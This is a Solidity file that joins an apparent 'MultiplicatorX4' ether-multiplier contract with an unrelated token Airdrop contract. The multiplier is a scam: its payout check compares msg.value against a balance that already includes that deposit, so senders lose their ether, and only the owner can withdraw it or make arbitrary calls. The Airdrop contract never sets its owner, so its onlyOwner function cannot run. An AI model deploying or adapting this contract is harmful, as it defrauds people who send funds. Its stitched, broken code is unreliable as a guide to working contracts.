 

 pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}
contract Ownable {
    address public owner;

    modifier onlyOwner() {
        if (msg.sender != owner) {
            throw;
        }
        _;
    }
}

contract Token{
    function transfer(address to, uint value) public returns (bool);
    function decimals() public returns (uint);
}

contract Airdrop is Ownable {
    function multisend(address _tokenAddr, address[] _to, uint256[] _value) public onlyOwner
    returns (bool _success) {
        assert(_to.length == _value.length);
        assert(_to.length <= 150);

        uint decimals = Token(_tokenAddr).decimals();
        for (uint8 i = 0; i < _to.length; i++) {
            assert((Token(_tokenAddr).transfer(_to[i], _value[i] * (10 ** decimals))) == true);
        }
        return true;
    }
}
